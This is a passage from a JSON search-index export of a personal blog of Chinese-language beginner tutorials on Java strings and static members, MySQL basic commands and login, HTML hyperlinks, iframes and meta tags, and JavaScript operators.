System.out.println(Math.ceil(c));//32 //向下取整 System.out.println(\"==========================================\"); System.out.println(Math.floor(a));//31 System.out.println(Math.floor(b));//31 System.out.println(Math.floor(c));//31 System.out.println(\"==========================================\"); //四舍五入 System.out.println(Math.round(a));//31 System.out.println(Math.round(b));//32 System.out.println(Math.round(c));//31 System.out.println(\"==========================================\"); //圆周率 System.out.println(Math.PI);//3.141592653589793 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java将字符串转换为字符数组","slug":"java00072将字符串转换为字符数组","date":"2020-03-03T04:02:50.000Z","updated":"2020-03-03T04:09:06.916Z","comments":true,"path":"2020/03/03/java00072将字符串转换为字符数组/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/03/java00072将字符串转换为字符数组/","excerpt":"","text":"java将字符串转换为字符数组 格式: 字符串.toCharArray() 返回一个字符数组 12345678910111213package xiaochenyan.top.Demo;public class Main19&#123; public static void main(String[] args) &#123; String str = \"agsagasfsdtahsa\"; //将字符串转换为字符数组 char[] chars = str.toCharArray(); for (int i = 0; i &lt; chars.length; i++) &#123; System.out.println(chars[i]); &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java字符串倒序","slug":"java00071字符串倒序","date":"2020-03-03T03:57:23.000Z","updated":"2020-03-03T04:01:34.019Z","comments":true,"path":"2020/03/03/java00071字符串倒序/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/03/java00071字符串倒序/","excerpt":"","text":"java字符串倒序 快捷键技巧: 数组倒序遍历 数组名.forr自动生成: 123for (int i = arrayName.length-1; i &gt;= 0 ; i--) &#123;&#125; 1234567891011121314package xiaochenyan.top.Demo;import java.util.Arrays;public class Main17&#123; public static void main(String[] args) &#123; String[] str = &#123;\"aaa\",\"ddd\",\"ccc\",\"bbb\"&#125;; //先将字符串升序 Arrays.sort(str); //然后从后往前遍历数组 for (int i = str.length-1; i &gt;= 0 ; i--) &#123; System.out.println(str[i]); &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java数组工具类Arrays","slug":"java00070数组工具类Arrays","date":"2020-03-03T03:44:05.000Z","updated":"2020-03-03T03:56:38.395Z","comments":true,"path":"2020/03/03/java00070数组工具类Arrays/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/03/java00070数组工具类Arrays/","excerpt":"","text":"java数组工具类Arrays java.util.Arrays是一个与数组相关的工具类,里面提供了大量静态方法,用来实现数组常见的操作. public static String toString(数组): 将参数数组变成字符串(按照默认格式: [元素1,元素2,元素3,…]) public static void sort(数组),按照默认升序(从小到大)对数组元素进行排序. 备注: 1.如果是数组,sort默认按照升序从小到大 2.如果是字符串,sort默认按照字母升序 3.如果是自定义的类型,那么这个自定义的类需要有Comparable或者Comparator接口支持. 1234567891011121314151617package xiaochenyan.top.Demo;import java.util.Arrays;public class Main18&#123; public static void main(String[] args) &#123; String[] str = &#123;\"aaa\",\"ccc\",\"bbb\"&#125;; int[] num = &#123;1,3,5,2,6,34,24&#125;; //str数组排序 Arrays.sort(str); //将str数组转换为字符串 System.out.println(Arrays.toString(str)); //int数组排序 Arrays.sort(num); //将int数组转换为字符串 System.out.println(Arrays.toString(num)); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"静态代码块","slug":"java00069静态代码块","date":"2020-02-29T12:20:39.000Z","updated":"2020-02-29T12:31:17.494Z","comments":true,"path":"2020/02/29/java00069静态代码块/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/29/java00069静态代码块/","excerpt":"","text":"静态代码块 静态代码块格式: 12345public class 类名&#123; static&#123; //静态代码块内容 &#125;&#125; 特点: 当第一次用到本类时,静态代码块执行唯一的一次 静态内容总是优先于非静态,所以静态代码块比构造方法先执行. 静态代码块用途: 用来一次性的对静态成员变量进行赋值. 12345public class demo01&#123; public static void main(String[] args) &#123; JinTaiDaiMaKuai one = new JinTaiDaiMaKuai(); &#125;&#125; 123456789public class JinTaiDaiMaKuai&#123; static &#123; System.out.println(\"我是静态代码块\"); &#125; public JinTaiDaiMaKuai() &#123; System.out.println(\"我是构造函数\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"静态static的内存图","slug":"java00068静态static的内存图","date":"2020-02-27T13:28:50.000Z","updated":"2020-02-27T13:29:52.382Z","comments":true,"path":"2020/02/27/java00068静态static的内存图/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/27/java00068静态static的内存图/","excerpt":"","text":"静态static的内存图","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"MYSQL常见命令","slug":"mysql006MYSQL常见命令","date":"2020-02-26T23:03:01.000Z","updated":"2020-02-26T23:20:14.392Z","comments":true,"path":"2020/02/27/mysql006MYSQL常见命令/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/27/mysql006MYSQL常见命令/","excerpt":"","text":"MYSQL常见命令 1.查看当前所有的数据库 show databases; 2.打开指定的库 use 库名; 3.查看当前库的所有表 show tables; 4.查看其他库的所有表 show tables from 库名; 5.创建表 12345create table 表名( 列名 列类型, 列名 列类型, ...); 6.查看表结构 desc 表名; 7.查看数据库版本 方式一:登录到mysql服务端 select version(); 方式二:没有登录到mysql服务端 mysql --version或者mysql -V","categories":[{"name":"MYSQL","slug":"MYSQL","permalink":"https://xiaowuyoucy.github.io/categories/MYSQL/"}],"tags":[]},{"title":"MYSQL服务端的登录和退出","slug":"mysql005MYSQL服务端的登录和退出","date":"2020-02-26T22:49:57.000Z","updated":"2020-02-26T23:01:19.621Z","comments":true,"path":"2020/02/27/mysql005MYSQL服务端的登录和退出/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/27/mysql005MYSQL服务端的登录和退出/","excerpt":"","text":"MYSQL服务端的登录和退出 1.用mysql自带的客户端 直接输入密码就可以进入数据库管理系统了 2.使用cmd登录 1234567891011121314151617181920// -h 连接的主机 -P 代表端口号//第一种方式mysql -h 主机名 -P 端口号 -u 用户名 -p// mysql -h localhost -P 3306 -u root -p//第二种方式mysql -h 主机名 -P 端口号 -u 用户名 -p密码//mysql -h localhost -P 3306 -u root -p123//-p后面没有空格//第三种方式//在服务端本机登录可以省略mysql -u 用户名 -pmysql -u 用户名 -p密码 退出 用exit命令或者Ctrl + C","categories":[{"name":"MYSQL","slug":"MYSQL","permalink":"https://xiaowuyoucy.github.io/categories/MYSQL/"}],"tags":[]},{"title":"MYSQL服务的启动和停止","slug":"mysql004MYSQL服务的启动和停止","date":"2020-02-26T22:43:46.000Z","updated":"2020-02-26T22:49:09.711Z","comments":true,"path":"2020/02/27/mysql004MYSQL服务的启动和停止/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/27/mysql004MYSQL服务的启动和停止/","excerpt":"","text":"MYSQL服务的启动和停止 用管理员身份打开CMD命令 停止服务 1net stop 数据库服务名 开启服务 1net start 数据库服务名 第二种方式: 在图形服务管理中找到服务名,设置为开启状态","categories":[{"name":"MYSQL","slug":"MYSQL","permalink":"https://xiaowuyoucy.github.io/categories/MYSQL/"}],"tags":[]},{"title":"配置文件介绍","slug":"mysql003配置文件介绍","date":"2020-02-26T22:29:44.000Z","updated":"2020-02-26T22:42:43.192Z","comments":true,"path":"2020/02/27/mysql003配置文件介绍/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/27/mysql003配置文件介绍/","excerpt":"","text":"配置文件介绍 my.ini文件是数据库配置文件 客户端字符集 服务端配置: 服务端端口 服务端安装目录 数据库的管理文件目录 字符集 数据库存储引擎 语法模式 最大连接数 修改完之后,数据库服务要重启","categories":[{"name":"MYSQL","slug":"MYSQL","permalink":"https://xiaowuyoucy.github.io/categories/MYSQL/"}],"tags":[]},{"title":"MYSQL软件安装","slug":"mysql002MYSQL软件安装","date":"2020-02-26T21:26:20.000Z","updated":"2020-02-26T21:32:01.056Z","comments":true,"path":"2020/02/27/mysql002MYSQL软件安装/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/27/mysql002MYSQL软件安装/","excerpt":"","text":"MYSQL软件安装","categories":[{"name":"MYSQL","slug":"MYSQL","permalink":"https://xiaowuyoucy.github.io/categories/MYSQL/"}],"tags":[]},{"title":"数据库的相关概念","slug":"mysql001数据库的相关概念","date":"2020-02-24T01:59:40.000Z","updated":"2020-02-24T02:04:20.976Z","comments":true,"path":"2020/02/24/mysql001数据库的相关概念/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/24/mysql001数据库的相关概念/","excerpt":"","text":"数据库的相关概念","categories":[{"name":"MYSQL","slug":"MYSQL","permalink":"https://xiaowuyoucy.github.io/categories/MYSQL/"}],"tags":[]},{"title":"静态static关键字修饰成员方法","slug":"java00067静态static关键字修饰成员方法","date":"2020-02-18T23:57:16.000Z","updated":"2020-02-19T00:37:04.747Z","comments":true,"path":"2020/02/19/java00067静态static关键字修饰成员方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/19/java00067静态static关键字修饰成员方法/","excerpt":"","text":"静态static关键字修饰成员方法 1.一旦使用static修饰成员方法,那么这就成为了静态方法. 2.静态方法不属于对象,而是属于类的. 3.如果没有用static关键字,那么首先必须先创建对象,然后通过对象才能使用成员方法. 4.对于静态方法来说,可以通过对象名进行调用,也可以通过类名来调用.但推荐使用类名来调用. 5.如果是使用对象名来调用静态成员变量,在编译之后也会被javac翻译成为类名.静态方法名 6.如果有了static关键字,那么不需要创建对象,直接就能通过类名称来使用它 7.无论是成员变量还是成员方法,如果有了static,都推荐使用类名称进行调用. 8.静态成员变量:类名称.静态变量; 9.静态方法:类名称.静态方法(); 10.对于在本类当中的静态方法,可以省略类名称. 注意: 1.静态不能直接访问非静态. 原因:因为在内存当中,是先有的静态内容,后有的非静态内容. 2.静态方法不能使用this. 原因:this代表当前对象,通过谁调用的方法,谁就是对象. 123456789101112131415public class Main16&#123; public static void main(String[] args) &#123; Student2 stu = new Student2(\"小明\"); Student2.room = \"101课室\"; //使用成员方法 stu.showVar(); //使用静态成员方法 Student2.showStaticVar(); stu.showStaticVar();//不推荐使用对象名调用静态成员方法 &#125;&#125; 12345678910111213141516171819202122232425262728293031//创建一个Student2类public class Student2&#123; String name;/*====================================================================*/ public static String room; public Student2() &#123; &#125; public Student2(String name) &#123; this.name = name; &#125; /*====================================================================*/ //非静态成员方法 public void showVar() &#123; System.out.println(\"名字: \" + this.name); System.out.println(\"年龄: \" + Student2.room); showStaticVar(); //在本类中可以直接使用静态成员方法,不用加类名 Student2.showStaticVar(); //加类名使用静态成员方法 &#125; //静态成员方法 //属于类,不属于对象 public static void showStaticVar()&#123; System.out.println(\"年龄: \" + Student2.room); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"静态static关键字修饰成员变量","slug":"java00066静态static关键字修饰成员变量","date":"2020-02-18T22:58:40.000Z","updated":"2020-02-19T00:52:12.961Z","comments":true,"path":"2020/02/19/java00066静态static关键字修饰成员变量/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/19/java00066静态static关键字修饰成员变量/","excerpt":"","text":"静态static关键字修饰成员变量 如果一个成员变量使用了static关键字,那么这个变量就不再属于对象自己,而是属于所在的类.多个对象共享同一份数据. 格式: 123static int number;public static String name;private static float jiGe; 使用静态成员变量: 类名.静态成员变量; 对象名.静态成员变量; 修改静态成员变量的值: 类名.静态成员变量 = 1; 对象名.静态成员变量 = 1; 12345678910111213141516171819202122232425262728public class Main15&#123; public static void main(String[] args) &#123; Student one = new Student(\"张三丰\",102); Student two = new Student(\"张无极\",23); Student three = new Student(\"赵敏\",18); Student four = new Student(\"周芷若\",18); //使用静态成员变量 Student.room = \"101教师\"; System.out.println(\"名字:\" + one.getName() + \" 年龄:\" + one.getAge() + \" 课室\" + one.room + \" 学号:\" + one.getId() ); System.out.println(\"名字:\" + two.getName() + \" 年龄:\" + two.getAge() + \" 课室\" + two.room + \" 学号:\" + two.getId() ); System.out.println(\"名字:\" + three.getName() + \" 年龄:\" + three.getAge() + \" 课室\" + three.room + \" 学号:\" + three.getId() ); System.out.println(\"名字:\" + four.getName() + \" 年龄:\" + four.getAge() + \" 课室\" + four.room + \" 学号:\" + four.getId() ); &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738public class Student&#123; private String name; private int age; public static String room;//公开的静态成员变量 private int id; private static int countIdNumber;//私有的静态成员变量 public int getId() &#123; return id; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public Student(String name, int age) &#123; this.name = name; this.age = age; id = ++countIdNumber; &#125; public Student() &#123; id = ++countIdNumber; &#125;&#125; 快捷键: ​ 数字.fori按下回车或tab键之后,会自动生成一个循环6次的for循环语句 1234for(int i = 0;i &lt; 6;i++)&#123;&#125; 数组名.fori 1234for(int i = 0;i &lt; 数组名.lenght;i++)&#123;&#125; 变量名.sout 1System.out.println(变量名); 对象.sout 1System.out.println(对象名); 对象名.成员变量.sout 1System.out.println(对象名.成员变量); 数组名[i].sout 1System.out.println(数组名[i]);","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"静态static关键字概述","slug":"java00065静态static关键字概述","date":"2020-02-18T22:52:09.000Z","updated":"2020-02-18T23:08:07.752Z","comments":true,"path":"2020/02/19/java00065静态static关键字概述/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/19/java00065静态static关键字概述/","excerpt":"","text":"静态static关键字概述 static关键字表示多个对象共用一个静态成员变量 这个成员变量属于类.","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"按指定格式拼接字符练习","slug":"java00064按指定格式拼接字符-练习","date":"2020-02-18T21:26:59.000Z","updated":"2020-02-18T21:31:44.331Z","comments":true,"path":"2020/02/19/java00064按指定格式拼接字符-练习/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/19/java00064按指定格式拼接字符-练习/","excerpt":"","text":"按指定格式拼接字符练习 12345678910111213141516171819202122public class demo13&#123; public static void main(String[] args) &#123; int[] intArray = &#123;1,2,3,4&#125;; String str = pingJieZiFuChuan(intArray); System.out.println(str); &#125; public static String pingJieZiFuChuan(int[] intArray) &#123; String str = \"[\"; for (int i = 0; i &lt; intArray.length; i++) &#123; if(i == intArray.length - 1) &#123; str += \"word\" + intArray[i] + \"]\"; &#125;else&#123; str += \"word\" + intArray[i] +\"#\"; &#125; &#125; return str; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"统计输入的字符串中的各种字符次数","slug":"java00063统计输入的字符串中的各种字符次数","date":"2020-02-18T21:02:24.000Z","updated":"2020-02-18T21:09:27.250Z","comments":true,"path":"2020/02/19/java00063统计输入的字符串中的各种字符次数/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/19/java00063统计输入的字符串中的各种字符次数/","excerpt":"","text":"统计输入的字符串中的各种字符次数 1234567891011121314151617181920212223242526272829303132333435363738import java.util.Scanner;public class demo14&#123; public static void main(String[] args) &#123; String str ; int countNumber = 0; int countOther = 0; int countLower = 0; int countUpper = 0; Scanner sc = new Scanner(System.in); System.out.println(&quot;请输入字符串:&quot;); str = sc.next(); char[] chs = str.toCharArray(); for (int i = 0; i &lt; chs.length; i++) &#123; char ch = chs[i]; if(ch &gt;= &apos;a&apos; &amp;&amp; ch &lt;= &apos;z&apos;) &#123; countLower++; &#125;else if(ch &gt;= &apos;A&apos; &amp;&amp; ch &lt;= &apos;Z&apos; ) &#123; countUpper++; &#125;else if(ch &gt;= &apos;0&apos; &amp;&amp; ch &lt;= &apos;9&apos; )&#123; countNumber++; &#125;else &#123; countOther++; &#125; &#125; System.out.println(&quot;大写字母个数:&quot; + countUpper); System.out.println(&quot;小写字母个数:&quot; + countLower); System.out.println(&quot;数字个数:&quot; + countNumber); System.out.println(&quot;其他字符个数:&quot; + countOther); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"字符串的分割方法","slug":"java00059字符串的分割方法","date":"2020-02-18T20:17:16.000Z","updated":"2020-02-18T20:26:55.295Z","comments":true,"path":"2020/02/19/java00059字符串的分割方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/19/java00059字符串的分割方法/","excerpt":"","text":"字符串的分割方法 分割字符串的方法: public String[] split(String regex);按照参数的规则,将字符串切分成为若干部分. 注意事项: split方法的参数其实是一个&quot;正则表达式&quot;. 如果用英文句点&quot;.&quot;进行切分,必须写&quot;\\\\.&quot;(两个反斜杠) 123456789101112131415161718public class demo12&#123; public static void main(String[] args) &#123; String str1 = \"123,123,12w\"; String str2 = \"aaa.bbb.ccc\"; String[] strArray = str1.split(\",\"); for (int i = 0; i &lt; strArray.length; i++) &#123; System.out.println(strArray[i]); &#125; System.out.println(\"=========================\"); String[] str2Array = str2.split(\"\\\\.\"); for (int i = 0; i &lt; str2Array.length; i++) &#123; System.out.println(str2Array[i]); &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"字符串的转换相关方法","slug":"java00058字符串的转换相关方法","date":"2020-02-18T20:05:25.000Z","updated":"2020-02-18T20:10:56.491Z","comments":true,"path":"2020/02/19/java00058字符串的转换相关方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/19/java00058字符串的转换相关方法/","excerpt":"","text":"字符串的转换相关方法 String当中与转换相关的常用方法: public char[] toCharArray();将当前字符串拆分成为字符数组作为返回值. public byte[] getBytes();获得当前字符串底层的字节数组 public String replace(CharSequence oldString,CharSequence newString); 将所有出现的老字符串替换成为新的字符串,返回替换之后的结果为新字符串. 12345678910111213141516171819202122public class demo11&#123; public static void main(String[] args) &#123; String str1 = \"我爱你\"; char[] chArray = str1.toCharArray();//将str1转换为char[]数组 byte[] by = str1.getBytes();//将str1转换为byte[]数组; System.out.println(chArray[0]); for (int i = 0; i &lt; by.length; i++) &#123; System.out.println(by[i]); &#125; System.out.println(\"========================\"); String str2 = \"你麻痹的,你会不会啊\"; String str3 = str2.replace(\"麻痹\", \"**\");//str2.replace(要替换的字符串,替换的字符); System.out.println(str3); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"字符串的截取方法","slug":"java00057字符串的截取方法","date":"2020-02-18T19:26:50.000Z","updated":"2020-02-18T19:46:16.714Z","comments":true,"path":"2020/02/19/java00057字符串的截取方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/19/java00057字符串的截取方法/","excerpt":"","text":"字符串的截取方法 public String substring(int index);截取从参数位置一直到字符串末尾,返回新字符串. public String substring(int begin,int end); 截取从begin开始,一直到end结束. 备注:[begin,end),包含左边,不包含右边 快捷键: 按住ctrl + shift + 方向左右键可以多选字符串 按住shift + 方向左右键可以单选多个字符 123//改变String 对象的内容,其实是改变字符串的地址String str1 = \"123\";str1 = \"456\"; 12345678910111213141516public class demo10&#123; public static void main(String[] args) &#123; String str1 = \"123456\"; String str2 = str1.substring(2);//从第2号元素开始截取,一直到结束 System.out.println(str2); str2 = str1.substring(3,6); System.out.println(str2);//从第3号元素开始,一直到第6号元素.不包含第6号元素; str1 = \"11111\"; //0x1111 str1 = \"22222\"; //0x8888 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"超链接","slug":"html-css00014超链接","date":"2020-02-18T01:46:04.000Z","updated":"2020-03-03T13:12:11.709Z","comments":true,"path":"2020/02/18/html-css00014超链接/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/18/html-css00014超链接/","excerpt":"","text":"超链接 使用超链接可以让我们从一个页面跳转到另一个页面 使用a标签来创建一个超链接: 属性: href:指向链接跳转的目标地址,可以写一个相对路径也可以写一个完整地址. target:可以用来指定打开链接的位置 可选值: _self:表示在当前窗口中打开(默认值) _blank:在新的窗口中打开链接 ​ 123&lt;!-- 超链接 --&gt;&lt;a href=\"http://www.baidu.com\"&gt;我是一个超链接&lt;/a&gt;&lt;a href=\"demo.html\"&gt; 我是一个超链接&lt;/a&gt; 在新窗口打开页面 1234&lt;!-- 在本窗口跳转 --&gt;&lt;a href=\"http://www.baidu.com\" target=\"_self\"&gt;我是一个超链接&lt;/a&gt;&lt;!-- 在新窗口打开 --&gt;&lt;a href=\"demo.html\" target=\"_blank\"&gt; 我是一个超链接&lt;/a&gt; 可以在内联框架标签中设置一个name属性值,链接将会在指定的内联框架中打开 123&lt;!-- 内联框架中打开 --&gt;&lt;iframe src=\"demo.html name=\"tom\"&gt;&lt;/iframe&gt;&lt;a href=\"demo.html\" target=\"tom\"&gt;我在内联框架显示&lt;/a&gt; center标签中的内容,会默认在页面中居中显示 如果我们要内容居中显示,要把内容都放到center标签中 123456&lt;!-- 居中显示 --&gt;&lt;center&gt; a aaaaaa aaaaaa&lt;/center&gt; 如果href中地址不确定,可以先用#代替 如果将链接地址设置为#,点击后会自动回到页面顶部 12&lt;!--回到页面顶部--&gt;&lt;a href=\"#\" target=\"tom\"&gt;我在内联框架显示&lt;/a&gt; html中有一个属性,每一个元素都可以设置,该属性可以作为标签的唯一标识 这个属性就是id,id属性在同一个页面中只能有一个,不能有重复 跳转到id为bottom的元素所在的位置 直接在href中写 #id属性值 12345&lt;a href=\"#bottom\"&gt;回到底部&lt;/a&gt;&lt;!--跳到这里--&gt;&lt;a id=\"bottom\" href=\"https://www.baidu.com\"&gt;哈哈哈&lt;/a&gt; 发送邮件的超链接,点击链接以后可以自动打开计算机中默认的邮件客户端 当点击这个链接时会自动打开计算机中默认的邮件客户端,并且将收件人设置为mailto后的邮箱地址. 格式: &lt;a href=&quot;mailto:邮箱地址&quot; &gt;联系我们&lt;a&gt; 1&lt;a href=\"mailto:123@qq.com\" &gt;联系我们&lt;a&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"内联框架","slug":"html-css00013内联框架","date":"2020-02-17T22:29:31.000Z","updated":"2020-02-17T22:39:32.645Z","comments":true,"path":"2020/02/18/html-css00013内联框架/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/18/html-css00013内联框架/","excerpt":"","text":"内联框架 使用内联框架可以引入一个外部的页面. 使用iframe来创建一个内联框架 属性: src:指向一个外部页面的路径,可以使用相对路径 width:设置宽度 height:设置高度 不会按比例缩放 name:可以为内联框架指定一个name属性(给框架起名字) 在现实开发中不推荐使用内联框架,因为内联框架中的内容不会被搜索引擎所检索,但可以在内网使用; 一般放在body标签内 格式:&lt;iframe scr=&quot;目标路径&quot; name=&quot;名字&quot;&gt; 1&lt;iframe scr=\"demo.html\" name=\"tom\"&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"xHtml的语法规范","slug":"html-css00012xHtml的语法规范","date":"2020-02-17T21:25:32.000Z","updated":"2020-02-18T02:26:50.768Z","comments":true,"path":"2020/02/18/html-css00012xHtml的语法规范/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/18/html-css00012xHtml的语法规范/","excerpt":"","text":"xHtml的语法规范 浏览器会尽最大的努力正确解析错误的语法,你所有的不符合语法规范的内容,浏览器都会为你自动修正,但是有些情况会修正错误. 1.HTML中不区分大小写,但是我们一般都使用小写 1&lt;p&gt;aaaaaaaaa&lt;/p&gt; 2.HTML中的注释不能嵌套 1234567891011&lt;!--正确写法--&gt;=================================================错误写法&lt;!-- &lt;!-- --&gt;--&gt; 3.HTML标签必须结构完整,要么成对出现,要么自结束标签. 12345&lt;!--正确写法--&gt;&lt;p&gt;aaaaa&lt;/p&gt; &lt;!--错误写法--&gt;&lt;p&gt;asdfdsf 4.HTML标签可以嵌套,但是不能交叉嵌套. 12345&lt;!--正确写法--&gt;&lt;p&gt;aaaa&lt;font color=\"red;\"&gt;aaa&lt;/font&gt;aaa&lt;/p&gt;&lt;!--错误写法--&gt;&lt;p&gt;aaaa&lt;font color=\"red;\"&gt;aaaaaa&lt;/p&gt;&lt;/font&gt; 5.HTML标签中的属性必须有值,且值必须加引号(双引号,单引号都可以) 12345&lt;!--正确写法--&gt;&lt;p&gt;aaaa&lt;font color=\"red;\"&gt;aaa&lt;/font&gt;aaa&lt;/p&gt;&lt;!--错误写法--&gt;&lt;p&gt;aaaa&lt;font color&gt;aaa&lt;/font&gt;aaa&lt;/p&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"meta标签","slug":"html-css00011meta标签","date":"2020-02-17T21:09:02.000Z","updated":"2020-02-18T02:23:00.419Z","comments":true,"path":"2020/02/18/html-css00011meta标签/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/18/html-css00011meta标签/","excerpt":"","text":"meta标签 使用meta标签还可以用来设置网页的关键字 格式:&lt;meta name=&quot;keywords&quot; content = &quot;关键字&quot; /&gt; 如果是多个关键字,就用逗号隔开. 关键字是被搜索引擎识别的. 1&lt;meta name=\"keywords\" content=\"HTML5,JavaScript,前端,Java\" /&gt; 使用meta标签用来指定网页的描述 搜索引擎在检索页面时,会同时检索页面中的关键字和描述,但是这两个值不会影响页面在搜索引擎中的排名. 格式:&lt;meta name=&quot;description&quot; content=&quot;描述信息&quot; /&gt; 1&lt;meta name=\"description\" content=\"发布h5,js前端等相关信息\" /&gt; 使用meta可以用来做请求重定向(页面跳转). 格式:&lt;meta http-equiv=&quot;refresh&quot; content=&quot;秒数;url=目标路径&quot; /&gt; 目标路径可以是相对地址 绝对路径要在开头加上https://或http:// 1&lt;meta http-equiv=\"refresh\" content=\"5;http://www.baidu.com\" /&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"算数运算符","slug":"JS00015算数运算符","date":"2020-02-17T09:11:12.000Z","updated":"2020-03-01T10:10:49.980Z","comments":true,"path":"2020/02/17/JS00015算数运算符/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/17/JS00015算数运算符/","excerpt":"","text":"算数运算符 运算符也叫操作符 通过运算符可以对一个或多个值进行运算,并获取运算结果 比如:typeof就是运算符,可以来获得一个值的类型,它会将该值的类型以字符串的形式返回number string boolean undefined object 1234567console.log(typeof(\"123\"));//stringconsole.log(typeof(1));//numberconsole.log(typeof(1.6));//numberconsole.log(typeof(null));//objectconsole.log(typeof(undefined));//undefinedconsole.log(typeof(NaN));//NaNconsole.log(typeof(true));//boolean 算数运算符: + - * / % 当对非Number类型的值进行运算时,会将这些值转换为Number然后在运算. 任何值和NaN做运算都得NaN 1. +可以对两个值进行加法运算,并将结果返回. 如果对两个字符串做加法,则会拼接在一起 任何值和字符串做加法运算,都会先转换为字符串,然后再拼接 我们可以利用这一点特性来为任何数据类型做String转换. 这是一种隐式类型转换,实际上也是调用了String() 1234567891011121314var a = 123;a = 123 + 2;//125a = true + 1;//2a = true + false;//1a = 2 + null;//2a = 2 + NaN;//NaNa = \"aaa\" + \"bbb\";//aaabbba = 100 + \"aa\";//100aa 2. -可以对两个值进行减法运算,并将结果返回 任何数据类型和数字做减法都会先转换为Number 123456var a = 100;a = 100 - 1;//99a = 100 - \"1\";//99console.log(a - NaN);//NaNconsole.log(a - null);//100console.log(a - undefined);//NaN 3. *可以对两个值进行乘法运算,并将结果返回 任何数据类型和数字做乘法都会先转换为Number 123456var a = 100;a = 100 * 1;//100a = 100 * \"1\";//100console.log(a * NaN);//NaNconsole.log(a * null);//0console.log(a * undefined);//NaN 4. /可以对两个值进行除法运算,并将结果返回 任何数据类型和数字做除法都会先转换为Number 可以通过为一个值0 * &quot; 1 &quot; /1来将其转换为Number 原理和Number()函数一样,使用起来更加简单 1234567var a = 100;a = 100 / 1;//100a = 100 / \"1\";//100console.log(a / NaN);//NaNconsole.log(a / null);//出错 0不能做除数console.log(a / undefined);//NaNconsole.log(a + \"1\");//101 5.%取模运算符(取余数) 12var a = 10;a = a % 9;//1","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"转换为Boolean","slug":"JS00014转换为Boolean","date":"2020-02-17T08:58:33.000Z","updated":"2020-03-01T10:09:18.316Z","comments":true,"path":"2020/02/17/JS00014转换为Boolean/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/17/JS00014转换为Boolean/","excerpt":"","text":"转换为Boolean 将其他类型转换为Boolean 使用Boolean()函数 除了0和NaN,其他的都为true 字符串转布尔,除了空串,其余的都是true. null和undefined都会转换为false 对象也会转换为true 12345678910var a = 123;var b = 0;var c = NaN;var d = 